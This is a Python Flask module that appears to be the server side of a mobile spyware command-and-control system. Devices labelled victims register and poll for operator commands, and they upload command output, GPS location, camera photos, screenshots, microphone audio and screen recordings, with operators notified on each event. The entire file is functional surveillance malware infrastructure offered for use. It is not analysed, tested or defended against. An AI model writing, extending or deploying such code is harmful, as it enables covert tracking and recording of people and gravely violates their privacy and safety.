"""P3.4 -- mobile implant + admin (/api/mobile/*)"""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, STORE, _decode_data_url, _save_mobile_capture
import database as db  # legacy sibling module

import platform
bp = Blueprint("capture_mobile", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/mobile/register', methods=['POST'])
def mobile_register():
    """Register a new mobile client"""
    data = request.json
    uid = data.get('uid')
    info = data.get('info', {})

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    # Save to DATABASE (PERSISTENT - survives restart!)
    db.save_mobile_session(uid, info, request.remote_addr)
    
    # Also keep in memory for current session
    # P5.3: session/queue state lives behind the shared StateStore
    STORE.mobile_session_set(uid, info, request.remote_addr,
                             datetime.now().isoformat())

    # Send notification
    send_notification({
        "type": "Mobile Device Connected",
        "uid": uid,
        "platform": info.get('platform', 'Unknown'),
        "userAgent": info.get('userAgent', 'Unknown'),
        "timestamp": datetime.now().isoformat()
    })
    
    return jsonify({'status': 'registered'})

@bp.route('/api/mobile/poll', methods=['POST'])
def mobile_poll():
    """Mobile client polls for commands"""
    data = request.json
    uid = data.get('uid')
    
    # Update last seen in DATABASE
    db.update_mobile_last_seen(uid)
    
    STORE.mobile_last_seen_update(uid)  # no-op when uid unknown (legacy)

    # Check for commands
    cmd = STORE.mobile_command_dequeue(uid)
    if cmd is not None:
        return jsonify({'command': cmd})

    return jsonify({'command': None})

@bp.route('/api/mobile/response', methods=['POST'])
def mobile_response():
    """Mobile client sends command response"""
    data = request.json
    uid = data.get('uid')
    output = data.get('output')
    
    if uid:
        STORE.mobile_response_append(uid, output, datetime.now().isoformat())

    return jsonify({'status': 'received'})

@bp.route('/api/mobile/send_command', methods=['POST'])
def mobile_send_command():
    """Send command to mobile client"""
    data = request.json
    uid = data.get('uid')
    command = data.get('command')
    
    if uid and command:
        STORE.mobile_command_enqueue(uid, command)
        return jsonify({'status': 'queued'})
    
    return jsonify({'error': 'Invalid data'}), 400

@bp.route('/api/mobile/get_response/<uid>', methods=['GET'])
def mobile_get_response(uid):
    """Get latest response from mobile client"""
    response = STORE.mobile_response_pop(uid)
    if response is not None:
        return jsonify(response)

    return jsonify({'output': None})


# Global tracking data storage
# P3: MOBILE_TRACKING_DATA -> moved to app.state

@bp.route('/api/mobile/background_data', methods=['POST'])
def mobile_background_data():
    """Receive background tracking data from mobile client"""
    data = request.json
    uid = data.get('uid')
    tracking_data = data.get('data')
    
    if uid and tracking_data:
        # Store tracking data with timestamp
        # P5.3: per-uid tracking list (trim-at-100) lives in the StateStore
        tracking_data['received_at'] = datetime.now().isoformat()
        STORE.mobile_tracking_append(uid, tracking_data)
        
        # Send notification for important events
        if tracking_data.get('type') == 'background_location':
            send_notification({
                "type": "Mobile Location Update",
                "uid": uid,
                "latitude": tracking_data.get('latitude'),
                "longitude": tracking_data.get('longitude'),
                "timestamp": tracking_data.get('timestamp')
            })
        
        return jsonify({'status': 'received'})
    
    return jsonify({'error': 'Invalid data'}), 400

@bp.route('/api/mobile/tracking_data/<uid>', methods=['GET'])
def mobile_get_tracking_data(uid):
    """Get tracking data for a specific mobile client"""
    return jsonify({'data': STORE.mobile_tracking_all(uid)})

@bp.route('/api/mobile/camera', methods=['POST'])
def mobile_camera():
    """Mobile client sends camera capture"""
    data = request.json
    uid = data.get('uid')
    image_data = data.get('image')
    
    if uid and image_data:
        try:
            # Clean up headers if present
            if ',' in image_data:
                image_data = image_data.split(',')[1]
            
            decoded_data = base64.b64decode(image_data)
            fname = 'mobile_' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.jpg'
            images_dir = os.path.join(BASE_DIR, 'images')
            os.makedirs(images_dir, exist_ok=True)
            imgpath = os.path.join(images_dir, fname)
            
            with open(imgpath, 'wb') as f:
                f.write(decoded_data)
            
            # Store reference
            STORE.mobile_capture_set(uid, 'camera', fname,
                                     '/images/' + fname,
                                     {'size': len(decoded_data)})

            # Index in the capture gallery (persistent across restarts)
            db.save_mobile_capture(uid, 'camera', fname, '/images/' + fname, {
                'size': len(decoded_data)
            })
            
            # Send notification
            send_notification({
                "type": "Mobile Camera Capture",
                "uid": uid,
                "filename": fname,
                "timestamp": datetime.now().isoformat()
            })
            
            return jsonify({'status': 'saved', 'filename': fname})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    return jsonify({'error': 'Invalid data'}), 400

@bp.route('/api/mobile/screenshot', methods=['POST'])
def mobile_screenshot():
    """Mobile client sends a screenshot capture"""
    data = request.get_json(silent=True) or {}
    uid = data.get('uid')
    if not uid:
        return jsonify({'error': 'Invalid data'}), 400
    return _save_mobile_capture(uid, 'screenshot', 'image')

@bp.route('/api/mobile/audio', methods=['POST'])
def mobile_audio():
    """Mobile client sends a microphone recording"""
    data = request.get_json(silent=True) or {}
    uid = data.get('uid')
    if not uid:
        return jsonify({'error': 'Invalid data'}), 400
    return _save_mobile_capture(uid, 'audio', 'audio')

@bp.route('/api/mobile/screen_record', methods=['POST'])
def mobile_screen_record():
    """Mobile client sends a screen recording"""
    data = request.get_json(silent=True) or {}
    uid = data.get('uid')
    if not uid:
        return jsonify({'error': 'Invalid data'}), 400
    return _save_mobile_capture(uid, 'screen_record', 'video')

@bp.route('/api/mobile/captures', methods=['GET'])
def mobile_captures():
    """List media captured from mobile victims (newest first)"""
    uid = request.args.get('uid')
    captures = db.get_mobile_captures(uid=uid)
    return jsonify({'captures': captures, 'count': len(captures)})

@bp.route('/api/mobile/clients', methods=['GET'])
def mobile_clients():
    """Get list of connected mobile clients - LOADS FROM DATABASE!"""
    clients = []
    now = datetime.now()
    
    # Load ALL sessions from database (PERSISTENT)
    all_sessions = db.get_all_mobile_sessions()
    
    # Merge with in-memory sessions
    # P5.3: merge runs through the StateStore (never overwrites live entries)
    STORE.mobile_sessions_import(all_sessions)

    # Now check which are active
    for uid, session in STORE.mobile_all_sessions().items():
        if not uid:
            # Skip corrupt sessions that have no uid
            continue
        try:
            last_seen = datetime.fromisoformat(session['last_seen'])
            seconds_ago = (now - last_seen).total_seconds()
            
            # Show all sessions from last 24 hours (not just 60 seconds)
            if seconds_ago < 86400:  # 24 hours
                clients.append({
                    'uid': uid,
                    'info': session['info'],
                    'ip': session['ip'],
                    'last_seen': session['last_seen'],
                    'seconds_ago': int(seconds_ago),
                    'status': 'online' if seconds_ago < 60 else 'offline'
                })
        except:
            pass
    
    return jsonify({'clients': clients})
